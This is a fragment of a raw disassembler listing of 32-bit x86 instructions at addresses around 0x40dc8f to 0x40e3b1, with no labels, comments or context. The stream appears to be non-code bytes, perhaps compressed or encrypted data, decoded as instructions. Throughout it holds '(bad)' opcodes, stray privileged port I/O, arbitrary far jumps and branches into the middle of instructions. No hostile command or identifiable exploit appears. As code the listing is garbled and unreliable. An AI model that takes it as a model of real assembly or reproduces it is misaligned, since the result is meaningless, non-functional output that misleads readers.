  40dc8f:	inc    esp
  40dc90:	sub    ebp,0x6d
  40dc93:	xor    al,0x41
  40dc95:	aaa    
  40dc96:	dec    esi
  40dc97:	jbe    0x40dc9b
  40dc99:	repz and edx,DWORD PTR [ebp+0x6d]
  40dc9d:	cmp    dh,BYTE PTR [edx+0x7c7170fa]
  40dca3:	pop    ecx
  40dca4:	inc    DWORD PTR [edx+0x43]
  40dca7:	jno    0x40dcbc
  40dca9:	fadd   QWORD PTR [edi]
  40dcab:	loopne 0x40dc74
  40dcad:	loopne 0x40dcea
  40dcaf:	sbb    BYTE PTR [esp+ecx*1],bh
  40dcb2:	or     eax,0xcc88e864
  40dcb7:	out    dx,al
  40dcb8:	adc    ecx,DWORD PTR [esi-0x58]
  40dcbb:	jbe    0x40dc49
  40dcbd:	cmp    al,0x9
  40dcbf:	cmp    al,0xb8
  40dcc1:	jne    0x40dc69
  40dcc3:	rcl    DWORD PTR [ecx],cl
  40dcc5:	clc    
  40dcc6:	inc    esi
  40dcc7:	mov    edx,DWORD PTR [ecx+0x53]
  40dcca:	inc    ebx
  40dccb:	and    ch,0xf6
  40dcce:	mov    eax,ds:0x6a31770f
  40dcd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd4:	gs mov edi,0x1bd5f8e5
  40dcda:	push   esp
  40dcdb:	stos   DWORD PTR es:[edi],eax
  40dcdc:	adc    bh,0xd7
  40dcdf:	push   esi
  40dce0:	mov    ah,0xce
  40dce2:	dec    ecx
  40dce3:	leave  
  40dce4:	cmp    al,0xef
  40dce6:	in     al,dx
  40dce7:	mov    eax,0x44d616b9
  40dcec:	neg    dl
  40dcee:	inc    esp
  40dcef:	mov    esi,0x18484097
  40dcf4:	inc    eax
  40dcf5:	and    BYTE PTR [ebp-0x18],bh
  40dcf8:	pushf  
  40dcf9:	aas    
  40dcfa:	shl    BYTE PTR [esi+ebx*2+0x368562b9],0xf5
  40dd02:	dec    DWORD PTR [ecx]
  40dd04:	retf   0x25e3
  40dd07:	add    al,0x25
  40dd09:	loop   0x40dd18
  40dd0b:	jb     0x40dcac
  40dd0d:	sbb    al,0x7c
  40dd0f:	pushf  
  40dd10:	mov    ebx,DWORD PTR [eax-0x3d]
  40dd13:	lods   eax,DWORD PTR ds:[esi]
  40dd14:	pop    ebx
  40dd15:	jmp    0xe1:0x5669ad85
  40dd1c:	fidivr WORD PTR ds:0x6a3e6af3
  40dd22:	or     edx,edx
  40dd24:	rcl    BYTE PTR [ebp-0xf],cl
  40dd27:	sbb    al,0x72
  40dd29:	scas   al,BYTE PTR es:[edi]
  40dd2a:	pop    ds
  40dd2b:	retf   
  40dd2c:	ja     0x40dd8c
  40dd2e:	mov    esp,DWORD PTR cs:[eax+0x480db212]
  40dd35:	jge    0x40dcc0
  40dd37:	xchg   ebp,eax
  40dd38:	mov    gs,WORD PTR [esi-0x16906c77]
  40dd3e:	mov    ch,0xfb
  40dd40:	dec    eax
  40dd41:	push   ebp
  40dd42:	shl    BYTE PTR [ecx],0xa1
  40dd45:	mov    WORD PTR ds:0xbaef2fca,cs
  40dd4b:	push   ebx
  40dd4c:	ins    DWORD PTR es:[edi],dx
  40dd4d:	test   al,0x3e
  40dd4f:	pop    edi
  40dd50:	imul   esp,DWORD PTR [edi+ebx*8+0x6b68dbb2],0xffffffc2
  40dd58:	xchg   edx,eax
  40dd59:	pop    esi
  40dd5a:	push   0x1d62aaac
  40dd5f:	test   al,0x57
  40dd61:	dec    edi
  40dd62:	rol    BYTE PTR [edx-0x4d23a18d],0x67
  40dd69:	inc    eax
  40dd6a:	jp     0x40dd9c
  40dd6c:	cmp    eax,0x5f9b8770
  40dd71:	mov    esp,0x5f77c5b3
  40dd76:	lods   al,BYTE PTR ds:[esi]
  40dd77:	pop    edi
  40dd78:	push   es
  40dd79:	jnp    0x40dd67
  40dd7b:	sub    al,BYTE PTR [edi]
  40dd7d:	and    esp,ecx
  40dd7f:	add    DWORD PTR [edx+eax*8+0x46],edi
  40dd83:	or     al,BYTE PTR [edx+0x825a52c]
  40dd89:	outs   dx,BYTE PTR ds:[esi]
  40dd8a:	jno    0x40dd1b
  40dd8c:	xor    al,0x95
  40dd8e:	cwde   
  40dd8f:	add    al,0x6f
  40dd91:	mov    ds:0xfc2065c4,al
  40dd96:	add    eax,0x91c0a0a4
  40dd9b:	adc    DWORD PTR [eax],ebp
  40dd9d:	(bad)  
  40dd9e:	push   esp
  40dd9f:	hlt    
  40dda0:	push   ebp
  40dda1:	scas   al,BYTE PTR es:[edi]
  40dda2:	and    BYTE PTR [eax+ecx*4-0x14],bh
  40dda6:	sub    DWORD PTR [ebp+eax*8+0x14],edi
  40ddaa:	jo     0x40dd6b
  40ddac:	mov    BYTE PTR es:[ebx],0xa0
  40ddb0:	xchg   edi,eax
  40ddb1:	and    BYTE PTR [ebp+0x4c],al
  40ddb4:	js     0x40ddb6
  40ddb6:	jb     0x40de22
  40ddb8:	push   esi
  40ddb9:	mov    ebx,0x780ea1b9
  40ddbe:	sbb    al,0x4
  40ddc0:	(bad)  
  40ddc1:	or     BYTE PTR [ebp+0x75],dl
  40ddc4:	mov    ch,BYTE PTR [eax+0x33]
  40ddc7:	jns    0x40dd88
  40ddc9:	push   eax
  40ddca:	int    0xf6
  40ddcc:	repz sbb DWORD PTR [eax-0x1f],esp
  40ddd0:	imul   esp,DWORD PTR [ebp+0x5b],0xb5d981bf
  40ddd7:	jge    0x40ddc3
  40ddd9:	pop    esp
  40ddda:	inc    esi
  40dddb:	or     ch,BYTE PTR [edx-0x66]
  40ddde:	imul   esp,DWORD PTR [ecx],0xffffff9b
  40dde1:	xchg   BYTE PTR [ecx],al
  40dde3:	in     al,0xa5
  40dde5:	mov    al,ds:0xc0edc794
  40ddea:	xlat   BYTE PTR ds:[ebx]
  40ddeb:	jl     0x40de48
  40dded:	mov    bh,BYTE PTR [ecx]
  40ddef:	mov    BYTE PTR ds:0x47d1e528,ah
  40ddf5:	sbb    al,0x5f
  40ddf7:	daa    
  40ddf8:	call   0xc7254403
  40ddfd:	xchg   esi,eax
  40ddfe:	add    DWORD PTR [ebx+ecx*1],ecx
  40de01:	in     eax,dx
  40de02:	xchg   edx,eax
  40de03:	xchg   ecx,eax
  40de04:	xchg   edx,eax
  40de05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de06:	outs   dx,BYTE PTR fs:[esi]
  40de08:	cli    
  40de09:	outs   dx,DWORD PTR ds:[esi]
  40de0a:	jp     0x40de66
  40de0c:	clc    
  40de0d:	inc    esi
  40de0e:	jns    0x40de27
  40de10:	cmp    al,ah
  40de12:	and    eax,0x59529e0c
  40de17:	push   esp
  40de18:	pop    ecx
  40de19:	jg     0x40de0d
  40de1b:	cs fincstp 
  40de1e:	xor    DWORD PTR [ebx],eax
  40de20:	nop
  40de21:	mov    dl,0xa8
  40de23:	adc    ebp,DWORD PTR [esi-0x5a]
  40de26:	sbb    DWORD PTR [eax],0x29fc62bd
  40de2c:	test   DWORD PTR [edx+0x269f3f52],edi
  40de32:	cmp    cl,BYTE PTR [eax+0x64]
  40de35:	xchg   esp,eax
  40de36:	jecxz  0x40de19
  40de38:	out    dx,al
  40de39:	mov    edi,0x7ba264b3
  40de3e:	sub    edi,edx
  40de40:	sub    edi,eax
  40de42:	mov    edi,0xb2933db0
  40de47:	push   cs
  40de48:	stos   BYTE PTR es:[edi],al
  40de49:	rcr    DWORD PTR [esi-0x14020c53],1
  40de4f:	es or  al,0x2
  40de52:	xchg   BYTE PTR [edx+ecx*1+0x2e],al
  40de56:	leave  
  40de57:	or     al,0xee
  40de59:	pusha  
  40de5a:	popa   
  40de5b:	in     eax,dx
  40de5c:	jg     0x40de97
  40de5e:	and    DWORD PTR es:[ecx-0x4f],ebp
  40de62:	rol    BYTE PTR [eax+ebx*4-0x52],1
  40de66:	push   edi
  40de67:	mov    ah,0x29
  40de69:	xchg   ah,al
  40de6b:	sbb    dh,BYTE PTR [ebx-0x49]
  40de6e:	mov    ecx,0x15b587e7
  40de73:	inc    edx
  40de74:	js     0x40dead
  40de76:	(bad)  
  40de77:	cmp    eax,0xc4a2497a
  40de7c:	cli    
  40de7d:	sub    eax,0x188673ce
  40de82:	mov    al,ds:0x526cd17f
  40de87:	jnp    0x40deb4
  40de89:	or     esi,DWORD PTR [eax-0x51]
  40de8c:	inc    edx
  40de8d:	adc    edi,edx
  40de8f:	stc    
  40de90:	add    dl,dh
  40de92:	je     0x40de53
  40de94:	cmp    DWORD PTR [edx+ebx*4+0x66],ecx
  40de98:	adc    bh,BYTE PTR [ebp+esi*2+0x59e0af4f]
  40de9f:	int    0x24
  40dea1:	and    eax,0x87466c31
  40dea6:	push   es
  40dea7:	xor    ch,bh
  40dea9:	out    dx,al
  40deaa:	xchg   edi,eax
  40deab:	inc    edi
  40deac:	sti    
  40dead:	(bad)  
  40deae:	cmc    
  40deaf:	cmp    BYTE PTR [esi-0x5e],bl
  40deb2:	addr16 jl 0x40df19
  40deb5:	push   es
  40deb6:	sub    eax,0xa5e8700
  40debb:	shl    DWORD PTR [ebx+ebx*1+0xf],0x4c
  40dec0:	dec    esi
  40dec1:	and    DWORD PTR [ecx],edi
  40dec3:	mov    bl,0x9
  40dec5:	shl    DWORD PTR [ecx+0x53636dcd],0x9d
  40decc:	jle    0x40deff
  40dece:	cs xchg edx,eax
  40ded0:	mov    al,0x24
  40ded2:	mov    bh,0x25
  40ded4:	out    0xbb,eax
  40ded6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ded7:	not    BYTE PTR [ebp+ecx*1-0x7542352e]
  40dede:	and    eax,0x44d95c8
  40dee3:	inc    esi
  40dee4:	pop    edx
  40dee5:	shl    DWORD PTR [esi-0x42],0x28
  40dee9:	inc    edi
  40deea:	jno    0x40df1c
  40deec:	sti    
  40deed:	in     eax,0xef
  40deef:	xchg   edi,eax
  40def0:	jp     0x40df56
  40def2:	popf   
  40def3:	push   edi
  40def4:	fs icebp 
  40def6:	push   cs
  40def7:	inc    edi
  40def8:	aam    0x37
  40defa:	jge    0x40df2b
  40defc:	int    0x5e
  40defe:	fnstcw WORD PTR [esi-0x7e5c8f4f]
  40df04:	fwait
  40df05:	inc    esp
  40df06:	out    0x13,eax
  40df08:	fld    DWORD PTR [ecx]
  40df0a:	xor    edi,DWORD PTR ds:0xbc36f445
  40df10:	test   BYTE PTR [edx-0x4b800842],dl
  40df16:	mul    BYTE PTR [ebx-0x4261f7d8]
  40df1c:	ret    0x9fc4
  40df1f:	jns    0x40df4a
  40df21:	push   eax
  40df22:	shr    BYTE PTR [edx],cl
  40df24:	iret   
  40df25:	mov    esi,0x1e88a3a6
  40df2a:	stos   DWORD PTR es:[edi],eax
  40df2b:	ret    0x195a
  40df2e:	call   0x9fa:0xb1bf4ed9
  40df35:	jp     0x40df91
  40df37:	mov    al,ds:0x27226e76
  40df3c:	rol    DWORD PTR es:[edi+0x8ca17af],0x84
  40df44:	arpl   WORD PTR [ebx],bp
  40df46:	fucomp st(2)
  40df48:	in     eax,dx
  40df49:	ins    BYTE PTR es:[edi],dx
  40df4a:	xor    BYTE PTR [eax-0x6a],0x8c
  40df4e:	adc    dl,dl
  40df50:	mov    dh,0xbc
  40df52:	sbb    BYTE PTR [edx],dl
  40df54:	ss jns 0x40df02
  40df57:	stos   DWORD PTR es:[edi],eax
  40df58:	pop    ebp
  40df59:	or     cl,al
  40df5b:	iret   
  40df5c:	popf   
  40df5d:	dec    esp
  40df5e:	cdq    
  40df5f:	adc    eax,0xff16ade2
  40df64:	push   ecx
  40df65:	scas   eax,DWORD PTR es:[edi]
  40df66:	xchg   ecx,eax
  40df67:	mov    al,ds:0xc3ffd8b7
  40df6c:	push   ebx
  40df6d:	sbb    DWORD PTR [esi+ecx*8+0x17],esi
  40df71:	loop   0x40df3a
  40df73:	xchg   bh,bh
  40df75:	repz mov dl,0x4b
  40df78:	xchg   ecx,eax
  40df79:	sub    eax,0xbfdbf6ac
  40df7e:	adc    dl,BYTE PTR [esi-0x46]
  40df81:	jno    0x40df3d
  40df83:	outs   dx,DWORD PTR ds:[esi]
  40df84:	mov    ds:0xfdec4fd6,eax
  40df89:	adc    DWORD PTR [ecx+0x375d6072],esp
  40df8f:	clc    
  40df90:	xor    BYTE PTR [eax-0x43],0x6a
  40df94:	popa   
  40df95:	or     ebp,DWORD PTR [edx]
  40df97:	int3   
  40df98:	lea    edi,[ebp+0x34]
  40df9b:	dec    ebp
  40df9c:	(bad)  
  40df9d:	jb     0x40df9d
  40df9f:	mov    edi,0x963f07d8
  40dfa4:	fs mov ah,0x85
  40dfa7:	jmp    0xda85d4ec
  40dfac:	sub    DWORD PTR [esi],ecx
  40dfae:	mov    ss,WORD PTR [esp+ebp*8+0x14]
  40dfb2:	jbe    0x40df75
  40dfb4:	push   ds
  40dfb5:	push   eax
  40dfb6:	inc    ecx
  40dfb7:	cs loop 0x40df60
  40dfba:	mov    ds:0x661df81e,al
  40dfbf:	aas    
  40dfc0:	shl    DWORD PTR [ebx],cl
  40dfc2:	xchg   ecx,eax
  40dfc3:	or     esp,DWORD PTR [ebp-0x66]
  40dfc6:	xlat   BYTE PTR ds:[ebx]
  40dfc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfc8:	dec    edi
  40dfc9:	jne    0x40e005
  40dfcb:	push   es
  40dfcc:	out    dx,eax
  40dfcd:	scas   eax,DWORD PTR es:[edi]
  40dfce:	inc    edx
  40dfcf:	and    eax,0xb5fff979
  40dfd4:	(bad)  
  40dfd5:	sti    
  40dfd6:	mov    ebx,0x7212bd25
  40dfdb:	mov    ds:0x4abeae4f,al
  40dfe0:	aam    0x1d
  40dfe2:	xchg   esi,eax
  40dfe3:	jae    0x40e061
  40dfe5:	jno    0x40df90
  40dfe7:	push   esp
  40dfe8:	or     al,0x7a
  40dfea:	jb     0x40e015
  40dfec:	adc    ah,BYTE PTR [edi]
  40dfee:	clc    
  40dfef:	cmovs  eax,DWORD PTR [edi-0x5960383a]
  40dff6:	jbe    0x40dfa8
  40dff8:	xchg   edi,eax
  40dff9:	scas   al,BYTE PTR es:[edi]
  40dffa:	sub    al,0xf
  40dffc:	sub    DWORD PTR [ebx],ecx
  40dffe:	es in  al,0x3
  40e001:	or     edi,DWORD PTR [edx+0x6bfd0efe]
  40e007:	mov    edx,0x92707005
  40e00c:	aaa    
  40e00d:	xor    al,0x41
  40e00f:	aad    0x7e
  40e011:	jno    0x40df9d
  40e013:	arpl   ax,dx
  40e015:	aam    0xf
  40e017:	stc    
  40e018:	xchg   esi,eax
  40e019:	mov    ebx,0x5d0d5e31
  40e01e:	popa   
  40e01f:	ss ins DWORD PTR es:[edi],dx
  40e021:	xor    eax,0xa170acc9
  40e026:	jnp    0x40e011
  40e028:	cld    
  40e029:	xchg   ecx,eax
  40e02a:	adc    eax,0xef7032b8
  40e02f:	add    DWORD PTR [edi],eax
  40e031:	inc    ebp
  40e032:	mov    gs,WORD PTR [ebx-0x5bdd73e]
  40e038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e039:	fbld   TBYTE PTR cs:[ebp+ecx*1+0x151877bd]
  40e041:	aam    0x3a
  40e043:	js     0x40e0a8
  40e045:	push   cs
  40e046:	aad    0xa
  40e048:	and    eax,0x713bd046
  40e04d:	out    dx,eax
  40e04e:	mov    edx,DWORD PTR [edx+esi*8-0x9]
  40e052:	jmp    0xac36:0x10eb2e7
  40e059:	sbb    al,0x0
  40e05b:	mov    edx,0x1a9213a
  40e060:	adc    al,0xe5
  40e062:	xor    esi,ebp
  40e064:	test   DWORD PTR [esi-0x3b],esp
  40e067:	and    al,0x42
  40e069:	add    BYTE PTR [ebp-0x52],bh
  40e06c:	fadd   DWORD PTR [esi-0x7c]
  40e06f:	pop    ebx
  40e070:	sbb    al,0x70
  40e072:	test   DWORD PTR [edi-0x30],edi
  40e075:	icebp  
  40e076:	pop    ds
  40e077:	fdiv   DWORD PTR [eax-0x8]
  40e07a:	jnp    0x40e06d
  40e07c:	clc    
  40e07d:	pop    eax
  40e07e:	push   edi
  40e07f:	add    edx,DWORD PTR [esi]
  40e081:	inc    esi
  40e082:	mov    ds:0xc93804b5,eax
  40e087:	loopne 0x40e07b
  40e089:	mov    eax,0xfffbb3d4
  40e08e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40e090:	gs je  0x40e05c
  40e093:	rcr    DWORD PTR [ecx-0x6642bb3c],cl
  40e099:	aaa    
  40e09a:	fild   WORD PTR [edi-0x7d4bb850]
  40e0a0:	pusha  
  40e0a1:	lahf   
  40e0a2:	pop    eax
  40e0a3:	mov    ebp,ebx
  40e0a5:	jp     0x40e057
  40e0a7:	pop    edx
  40e0a8:	and    eax,DWORD PTR [edi-0x28]
  40e0ab:	pop    edx
  40e0ac:	in     al,0xd3
  40e0ae:	and    DWORD PTR [ecx],edi
  40e0b0:	outs   dx,BYTE PTR ds:[esi]
  40e0b1:	fdiv   st,st(3)
  40e0b3:	pop    esi
  40e0b4:	js     0x40e04c
  40e0b6:	mov    al,0xf
  40e0b8:	pop    ss
  40e0b9:	(bad)  [ecx]
  40e0bb:	sbb    al,0x71
  40e0bd:	sub    BYTE PTR [ecx-0x56d04f97],dl
  40e0c3:	test   eax,0x7b1ae3dc
  40e0c8:	cli    
  40e0c9:	adc    ecx,DWORD PTR [ebp+0x3c3be73c]
  40e0cf:	out    dx,eax
  40e0d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0d1:	arpl   si,di
  40e0d3:	into   
  40e0d4:	mov    dh,0x2b
  40e0d6:	mov    ch,0xf9
  40e0d8:	xchg   esp,eax
  40e0d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0da:	and    ch,BYTE PTR [ebx+0x14d955e4]
  40e0e0:	retf   0x1dc1
  40e0e3:	bnd ret 
  40e0e5:	adc    al,0x26
  40e0e7:	gs dec esp
  40e0e9:	inc    ecx
  40e0ea:	enter  0x8d08,0x78
  40e0ee:	mov    DWORD PTR [edi+ecx*2],esp
  40e0f1:	outs   dx,BYTE PTR ds:[esi]
  40e0f2:	in     eax,dx
  40e0f3:	std    
  40e0f4:	mov    ebp,0x4ef2a51f
  40e0f9:	xor    eax,DWORD PTR [edx-0xa]
  40e0fc:	adc    DWORD PTR [ecx-0x6d],ebp
  40e0ff:	mov    cl,0xda
  40e101:	xor    BYTE PTR ds:[ebx-0x7698c9e4],dh
  40e108:	stos   DWORD PTR es:[edi],eax
  40e109:	xchg   ecx,eax
  40e10a:	pop    ebp
  40e10b:	jb     0x40e0e8
  40e10d:	int3   
  40e10e:	fcmovbe st,st(2)
  40e110:	mov    cl,0xd4
  40e112:	or     BYTE PTR [ebx],al
  40e114:	(bad)  
  40e115:	ja     0x40e098
  40e117:	cmp    esi,DWORD PTR [ebp-0x57c0d31e]
  40e11d:	sbb    DWORD PTR [ecx+0x35],0x10
  40e121:	popf   
  40e122:	dec    edx
  40e123:	fld    st(0)
  40e125:	aad    0x9a
  40e127:	loop   0x40e10a
  40e129:	xchg   ebx,eax
  40e12a:	jno    0x40e0e0
  40e12c:	arpl   bp,ax
  40e12e:	lds    ecx,FWORD PTR [eax-0x64]
  40e131:	dec    edi
  40e132:	ror    BYTE PTR [esi+0x3c40940b],0x4a
  40e139:	loopne 0x40e1ad
  40e13b:	les    esi,FWORD PTR [edx+0x74284a3e]
  40e141:	add    al,0x31
  40e143:	cld    
  40e144:	popa   
  40e145:	jb     0x40e0f8
  40e147:	bsr    esp,DWORD PTR [edx]
  40e14a:	or     ah,al
  40e14c:	or     ebx,DWORD PTR [esi+0x124d7387]
  40e152:	push   DWORD PTR [edi]
  40e154:	add    eax,0x9699d206
  40e159:	cdq    
  40e15a:	xor    edx,esi
  40e15c:	add    ebx,esp
  40e15e:	push   ecx
  40e15f:	add    ebx,DWORD PTR [esp+edi*1-0x60a80c7b]
  40e166:	mov    dh,BYTE PTR [edx-0x4f]
  40e169:	dec    esp
  40e16a:	lods   eax,DWORD PTR ds:[esi]
  40e16b:	hlt    
  40e16c:	iret   
  40e16d:	fimul  WORD PTR [edi-0x54]
  40e170:	push   esp
  40e171:	loop   0x40e177
  40e173:	xchg   esi,eax
  40e174:	mov    ebp,esi
  40e176:	jns    0x40e197
  40e178:	add    eax,DWORD PTR [ecx-0x19]
  40e17b:	push   ecx
  40e17c:	stos   DWORD PTR es:[edi],eax
  40e17d:	(bad)  
  40e17e:	fidivr WORD PTR [edx-0x555c6ee0]
  40e184:	jg     0x40e143
  40e186:	or     eax,0xe367a35f
  40e18b:	inc    esp
  40e18c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e18d:	dec    edx
  40e18e:	and    BYTE PTR ds:0x7551211e,0x4a
  40e195:	jmp    0x40e1b8
  40e197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e198:	shl    BYTE PTR [ebx+0x20ace6ad],cl
  40e19e:	sub    edx,DWORD PTR [esi-0x439d7e40]
  40e1a4:	add    dl,bl
  40e1a6:	in     eax,dx
  40e1a7:	(bad)  
  40e1a8:	jmp    0xa75a:0xd2d8f254
  40e1af:	mov    edi,0x1db38a80
  40e1b4:	inc    esp
  40e1b5:	add    DWORD PTR [ebx-0x79ab4f97],esi
  40e1bb:	pop    edx
  40e1bc:	(bad)  
  40e1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1be:	jo     0x40e1df
  40e1c0:	jmp    0x40e1ca
  40e1c2:	shl    esi,1
  40e1c4:	xor    DWORD PTR [ebx],edi
  40e1c6:	dec    edi
  40e1c7:	pop    edx
  40e1c8:	or     edx,DWORD PTR [eax]
  40e1ca:	aad    0x14
  40e1cc:	(bad)  
  40e1cd:	imul   eax,DWORD PTR [esi+0x3e],0x85637d0
  40e1d4:	adc    DWORD PTR [edx-0x5aa569cb],eax
  40e1da:	jb     0x40e193
  40e1dc:	mov    al,0xbc
  40e1de:	xor    al,0xde
  40e1e0:	or     al,0x20
  40e1e2:	aas    
  40e1e3:	mov    ds:0x13f8405d,eax
  40e1e8:	inc    ebx
  40e1e9:	je     0x40e1ce
  40e1eb:	scas   eax,DWORD PTR es:[edi]
  40e1ec:	scas   al,BYTE PTR es:[edi]
  40e1ed:	es sub al,0x74
  40e1f0:	sub    esi,DWORD PTR [edx+0x1a]
  40e1f3:	xor    al,0x66
  40e1f5:	mov    esp,0xc748cfa7
  40e1fa:	mov    eax,0x5bda6a3
  40e1ff:	cmp    edx,ebx
  40e201:	bound  eax,QWORD PTR [eax]
  40e203:	mov    bl,0xd1
  40e205:	xchg   edi,eax
  40e206:	mov    ebx,0xbce9a2d5
  40e20b:	pop    edx
  40e20c:	jbe    0x40e237
  40e20e:	aaa    
  40e20f:	pop    ds
  40e210:	out    0x92,al
  40e212:	sub    BYTE PTR [esi-0x24],ch
  40e215:	xchg   ecx,eax
  40e216:	lods   al,BYTE PTR ds:[esi]
  40e217:	imul   ebx,DWORD PTR [esi],0x48452a40
  40e21d:	cmc    
  40e21e:	push   ds
  40e21f:	add    BYTE PTR [ebx],0xf0
  40e222:	int    0x76
  40e224:	repnz in al,dx
  40e226:	xor    al,0xc2
  40e228:	push   0x6f9cce25
  40e22d:	repnz sub BYTE PTR [eax-0x78e4cb89],ah
  40e234:	add    bl,ah
  40e236:	fwait
  40e237:	fs stos DWORD PTR es:[edi],eax
  40e239:	jno    0x40e1c5
  40e23b:	dec    edx
  40e23c:	aas    
  40e23d:	mov    al,0x75
  40e23f:	cmovbe ebx,edx
  40e242:	scas   eax,DWORD PTR es:[edi]
  40e243:	push   ebp
  40e244:	in     al,0x5f
  40e246:	mov    edx,0xe46aaedd
  40e24b:	pop    ebx
  40e24c:	xchg   edi,eax
  40e24d:	test   dl,bl
  40e24f:	test   al,0x5d
  40e251:	pop    ebp
  40e252:	mov    ebp,DWORD PTR [edx-0x48]
  40e255:	xchg   ebx,eax
  40e256:	jl     0x40e204
  40e258:	xor    edi,esp
  40e25a:	ja     0x40e29b
  40e25c:	call   0x8c87d4b8
  40e261:	loop   0x40e2e0
  40e263:	stos   DWORD PTR es:[edi],eax
  40e264:	pop    ebx
  40e265:	push   esp
  40e266:	jge    0x40e2bf
  40e268:	dec    esp
  40e269:	mov    bl,BYTE PTR [ecx-0x510b333c]
  40e26f:	mov    eax,0x885dfbe8
  40e274:	jge    0x40e234
  40e276:	inc    ebp
  40e277:	loope  0x40e2a0
  40e279:	imul   esi,ebp,0xffffff9d
  40e27c:	nop
  40e27d:	mov    dh,BYTE PTR ds:0x820f6dab
  40e283:	xor    DWORD PTR [ecx-0x71],ecx
  40e286:	js     0x40e26e
  40e288:	scas   eax,DWORD PTR es:[edi]
  40e289:	mov    al,0xa1
  40e28b:	jno    0x40e27b
  40e28d:	repnz pop edi
  40e28f:	push   edi
  40e290:	dec    esi
  40e291:	loopne 0x40e2b3
  40e293:	xchg   ecx,eax
  40e294:	ror    BYTE PTR [edx-0x79],0x23
  40e298:	out    0x3,al
  40e29a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e29b:	mov    ds:0x8db757db,eax
  40e2a0:	inc    bp
  40e2a2:	sbb    bl,dl
  40e2a4:	pusha  
  40e2a5:	push   edi
  40e2a6:	jle    0x40e2f9
  40e2a8:	mov    edx,0x90b66239
  40e2ad:	(bad)  
  40e2ae:	push   edx
  40e2af:	xor    ebp,DWORD PTR [ebx+0x4f]
  40e2b2:	push   es
  40e2b3:	ret    
  40e2b4:	sbb    esp,DWORD PTR [ebx]
  40e2b6:	data16 jbe 0x40e287
  40e2b9:	push   edi
  40e2ba:	and    DWORD PTR [esi],ecx
  40e2bc:	add    eax,ebx
  40e2be:	(bad)  
  40e2bf:	std    
  40e2c0:	mov    eax,ds:0x7c22ec1
  40e2c5:	shl    DWORD PTR [ebp+ebx*2+0x287f2835],cl
  40e2cc:	das    
  40e2cd:	cmp    eax,DWORD PTR [ecx-0x1e7319f3]
  40e2d3:	loope  0x40e348
  40e2d5:	out    dx,al
  40e2d6:	xchg   edi,eax
  40e2d7:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40e2d9:	sbb    eax,0xa240ac07
  40e2de:	fcmovnu st,st(6)
  40e2e0:	fidiv  WORD PTR [esp+ebp*2]
  40e2e3:	std    
  40e2e4:	cmc    
  40e2e5:	and    DWORD PTR [esi-0x57],0x9d4bbd1
  40e2ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2ed:	inc    edi
  40e2ee:	xchg   BYTE PTR [edx-0x78],al
  40e2f1:	mov    eax,0xf990185a
  40e2f6:	int3   
  40e2f7:	loopne 0x40e28a
  40e2f9:	les    eax,FWORD PTR [eax]
  40e2fb:	ja     0x40e299
  40e2fd:	add    al,0x5a
  40e2ff:	mov    al,0xcf
  40e301:	xchg   DWORD PTR [eax+0x6d],esi
  40e304:	inc    edx
  40e305:	and    ch,dl
  40e307:	mov    DWORD PTR [ebx+ebp*2+0x30],ecx
  40e30b:	or     esp,DWORD PTR [esp+ebx*1+0x539aad80]
  40e312:	fisttp DWORD PTR [ebp+0x9]
  40e315:	or     ebp,DWORD PTR [edi+esi*2+0x6b]
  40e319:	lods   eax,DWORD PTR ds:[esi]
  40e31a:	pusha  
  40e31b:	pop    ds
  40e31c:	jl     0x40e388
  40e31e:	cs xchg esp,eax
  40e320:	add    edx,DWORD PTR [ecx-0x50]
  40e323:	xor    bh,ah
  40e325:	mov    ebx,0xe3518643
  40e32a:	and    al,BYTE PTR [ecx+0x46]
  40e32d:	inc    esp
  40e32e:	adc    al,0x2b
  40e330:	int    0x78
  40e332:	cmp    eax,0x5d5e36b7
  40e337:	into   
  40e338:	add    DWORD PTR [eax-0x44],eax
  40e33b:	add    ecx,edi
  40e33d:	daa    
  40e33e:	push   ebp
  40e33f:	dec    ebx
  40e340:	xlat   BYTE PTR ds:[ebx]
  40e341:	jae    0x40e2ee
  40e343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e344:	adc    DWORD PTR [esi-0x31],edi
  40e347:	fwait
  40e348:	push   0x6a
  40e34a:	adc    BYTE PTR [edi+0x1e6648c1],dh
  40e350:	ss mov ebx,0x66a199cb
  40e356:	push   ebp
  40e357:	(bad)  
  40e358:	(bad)  
  40e359:	sbb    al,BYTE PTR [edx+0x2a]
  40e35c:	fadd   DWORD PTR [eax+esi*8-0xc]
  40e360:	xchg   edx,eax
  40e361:	into   
  40e362:	ret    
  40e363:	add    eax,ecx
  40e365:	fwait
  40e366:	xchg   bh,ah
  40e368:	dec    ebp
  40e369:	inc    ebx
  40e36a:	jo     0x40e30f
  40e36c:	inc    ecx
  40e36d:	jnp    0x40e3cd
  40e36f:	adc    DWORD PTR [ebx+ebp*1+0x63667f48],esi
  40e376:	sub    eax,0x28c30545
  40e37b:	adc    al,0x9e
  40e37d:	xchg   ax,ax
  40e37f:	out    0x7f,eax
  40e381:	out    dx,al
  40e382:	cmp    DWORD PTR [edi],eax
  40e384:	inc    ecx
  40e385:	aam    0x93
  40e387:	sbb    eax,0x1f7f345b
  40e38c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e38d:	push   edx
  40e38e:	or     BYTE PTR [ecx],bl
  40e390:	push   cs
  40e391:	stc    
  40e392:	loop   0x40e3c3
  40e394:	ret    
  40e395:	arpl   WORD PTR [esi+eax*1-0x1e],si
  40e399:	imul   edi,DWORD PTR [edi-0x7a2a4139],0x4d2ef334
  40e3a3:	call   0xf7db:0x4ce12089
  40e3aa:	into   
  40e3ab:	add    eax,0xc5a319a7
  40e3b0:	push   esp
  40e3b1:	dec    esi
